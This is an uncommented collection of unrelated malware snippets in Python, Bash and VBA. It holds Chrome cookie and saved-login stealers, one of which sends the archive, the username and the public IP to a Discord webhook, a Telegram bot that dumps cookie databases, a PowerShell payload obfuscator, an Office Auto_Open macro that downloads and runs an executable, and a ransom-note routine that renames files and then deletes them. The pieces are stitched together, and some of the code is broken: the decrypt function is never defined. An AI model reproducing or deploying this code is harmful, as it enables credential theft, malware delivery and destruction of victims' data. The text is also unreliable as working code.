import discord
import zipfile
import os

def zip(src, dst):
    zf = zipfile.ZipFile("%s.zip" % (dst), "w", zipfile.ZIP_DEFLATED)
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            print('zipping %s as %s' % (os.path.join(dirname, filename),
                                        arcname))
            zf.write(absname, arcname)
    zf.close()

def main():
    zip('C:\\Users\\' + os.getlogin() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies', 'cookies')
    zip('C:\\Users\\' + os.getlogin() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data', 'logins')
    zip('C:\\Users\\' + os.getlogin() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data', 'webdata')

    client = discord.Client()

    @client.event
    async def on_ready():
        print('We have logged in as {0.user}'.format(client))

    @client.event
    async def on_message(message):
        if message.author == client.user:
            return

        if message.content.startswith('$hello'):
            await message.channel.send('Hello!')

    client.run('TOKEN')

if __name__ == "__main__":
    main()

#!/bin/bash

# This script will automatically give permission to an APK to run on your device.

# Make sure you have an APK file in the current directory before running this script.

# Get the filename of the APK file

APKFILE=$(ls *.apk)

# Get the package name of the APK file

PKG=$(aapt dump badging $APKFILE | grep package | awk '{print $2}' | sed s/name=//g | sed s/\'//g)

# Get the full path of the APK file

APKPATH=$(realpath $APKFILE)

# Give the APK file permission to run on your device

adb shell pm grant $PKG android.permission.WRITE_EXTERNAL_STORAGE

adb shell pm grant $PKG android.permission.READ_EXTERNAL_STORAGE

adb shell pm grant $PKG android.permission.INTERNET

# Install the APK file on your device

adb install $APKPATH

import os
import time
import sqlite3
import shutil
import telebot
from telebot import types
from selenium import webdriver

bot = telebot.TeleBot('TOKEN')

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Please send me a link to Google Chrome cookies DB')

@bot.message_handler(content_types=['document'])
def get_file_id(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open('cookies.db', 'wb') as new_file:
        new_file.write(downloaded_file)

    conn = sqlite3.connect('cookies.db')
    c = conn.cursor()
    c.execute("SELECT host_key, name, value, path, expires_utc, secure, httponly, last_access_utc, has_expires, persistent, priority, encrypted_value FROM cookies")
    all_rows = c.fetchall()
    conn.close()

    bot.send_message(message.chat.id, 'Sending cookies...')

    for row in all_rows:
        bot.send_message(message.chat.id, row)

bot.polling()

import discord
import zipfile
import os
import platform
import getpass
import requests
import json

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if platform.system() == 'Windows':
    path = os.getenv('APPDATA') + '\\Google\\Chrome\\User Data\\Default\\'
elif platform.system() == 'Darwin':
    path = os.getenv('HOME') + '/Library/Application Support/Google/Chrome/Default/'
else:
    path = os.getenv('HOME') + '/.config/google-chrome/Default/'

if not os.path.exists(path):
    print('[-] Chrome doesn\'t exists')
    exit()

zipf = zipfile.ZipFile('cookies.zip', 'w', zipfile.ZIP_DEFLATED)
zipdir(path, zipf)
zipf.close()

url = 'https://api.ipify.org?format=json'
r = requests.get(url)
ip = json.loads(r.text)['ip']

username = getpass.getuser()

with open('cookies.zip', 'rb') as f:
    response = discord.Webhook.from_url(os.environ['DISCORD_WEBHOOK'], content=f.read(), filename='cookies.zip')
    response.send(username=username, content=ip)

import os
import random
import string

def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def obfuscate(payload):
    obfuscated = ""
    for x in payload:
        obfuscated += randomString() + " + "
    obfuscated += "\"" + x + "\""
    return obfuscated

def deobfuscate(payload):
    deobfuscated = ""
    for x in payload.split("+"):
        deobfuscated += x.strip(" ").strip("\"")
    return deobfuscated

if __name__ == "__main__":
    print("[+] Enter the powershell payload:")
    payload = input()
    print("[+] Obfuscating...")
    obfuscated = obfuscate(payload)
    print("[+] Done!")
    print("[+] The obfuscated payload is:")
    print(obfuscated)
    print("[+] Deobfuscating...")
    deobfuscated = deobfuscate(obfuscated)
    print("[+] Done!")
    print("[+] The deobfuscated payload is:")
    print(deobfuscated)

Sub Auto_Open()

Dim url As String
Dim fileName As String

url = "https://www.example.com/file.exe"
fileName = "file.exe"

Dim WinHttpReq As Object
Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
WinHttpReq.Open "GET", url, False
WinHttpReq.Send

If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.ResponseBody
    oStream.SaveToFile Environ("AppData") & "\" & fileName, 2
    oStream.Close
End If

CreateObject("WScript.Shell").Run Environ("AppData") & "\" & fileName

End Sub

import os
import random
import string
import json
import base64

from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def encrypt(key, filename):
	chunksize = 64*1024
	outputFile = "(encrypted)"+filename
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = ''

	for i in range(16):
		IV += chr(random.randint(0, 0xFF))

	encryptor = AES.new(key, AES.MODE_CBC, IV)

	with open(filename, 'rb') as infile:
		with open(outputFile, 'wb') as outfile:
			outfile.write(filesize)
			outfile.write(IV)

			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ' ' * (16 - (len(chunk) % 16))

				outfile.write(encryptor.encrypt(chunk))


def getKey(password):
	hasher = SHA256.new(password)
	return hasher.digest()

def Main():
	choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt?: ")

	if choice == 'E':
		filename = raw_input("File to encrypt: ")
		password = raw_input("Password: ")
		encrypt(getKey(password), filename)
		print "Done."
	elif choice == 'D':
		filename = raw_input("File to decrypt: ")
		password = raw_input("Password: ")
		decrypt(getKey(password), filename)
		print "Done."
	else:
		print "No Option selected, closing..."

if __name__ == '__main__':
	Main()

import os
import time
import random
import string

def ransom_code():

    # list of possible ransom note phrases
    phrases = [
        "Your files have been encrypted!",
        "You have 24 hours to pay the ransom!",
        "If you don't pay, your files will be deleted!",
        "Pay the ransom to get your files back!"
    ]

    # select a random phrase from the list
    phrase = random.choice(phrases)

    # list of possible ransom amounts
    amounts = [
        "100",
        "200",
        "300",
        "400",
        "500"
    ]

    # select a random amount from the list
    amount = random.choice(amounts)

    # list of possible ransom payment methods
    methods = [
        "PayPal",
        "Bitcoin",
        "Credit Card"
    ]

    # select a random payment method from the list
    method = random.choice(methods)

    # generate a random 8-character string for the file extension
    extension = ''.join(random.choice(string.ascii_lowercase) for i in range(8))

    # create the ransom note
    ransom_note = """
    {phrase}

    You have to pay {amount} dollars to get your files back.
    Send the money using {method} within 24 hours.
    If you don't pay in time, your files will be deleted!
    """.format(phrase=phrase, amount=amount, method=method)

    # write the ransom note to a file
    with open("ransom_note.txt", "w") as f:
        f.write(ransom_note)

    # encrypt all files in the current directory
    for filename in os.listdir("."):
        # skip the ransom note file
        if filename == "ransom_note.txt":
            continue

        # encrypt the file
        os.rename(filename, filename + "." + extension)

    # wait for 24 hours
    time.sleep(86400)

    # delete all files
    for filename in os.listdir("."):
        # skip the ransom note file
        if filename == "ransom_note.txt":
            continue

        # delete the file
        os.remove(filename)
